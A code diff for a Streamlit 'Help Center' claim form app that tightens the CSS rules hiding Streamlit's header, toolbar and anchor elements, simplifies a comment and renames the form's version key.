@@ -31,12 +31,18 @@ st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    /* Hide Streamlit elements and header anchors */
+    /* Hide all Streamlit header elements, anchors and link icons */
     [data-testid='stHeader'], header, footer, .stDeployButton, 
-    .section-anchor, a.section-anchor, [data-testid='stHeaderActionElements'],
+    .section-anchor, a.section-anchor, 
+    [data-testid='stHeaderActionElements'], .st-emotion-cache-gi0tri, .etxdrby3,
     [data-testid='stToolbar'], [data-testid='stElementToolbar'],
     .st-emotion-cache-140j12g, button[title='View fullscreen'] {
-        display: none !important; visibility: hidden !important; height: 0 !important; width: 0 !important;
+        display: none !important; 
+        visibility: hidden !important; 
+        height: 0 !important; 
+        width: 0 !important;
+        opacity: 0 !important;
+        pointer-events: none !important;
     }
 
     /* Disable pointers globally for images/headers except in promo box */
@@ -73,7 +79,7 @@ st.markdown("""<style>
         cursor: pointer !important;
     }
 
-    /* CLEAN LEGAL FOOTER - Fix for 'Member' box issue */
+    /* CLEAN LEGAL FOOTER */
     .legal-container {
         font-size: 11px !important; 
         color: #666 !important; 
@@ -102,7 +108,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_5", clear_on_submit=True):
+    with st.form("claim_v32_7_6", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
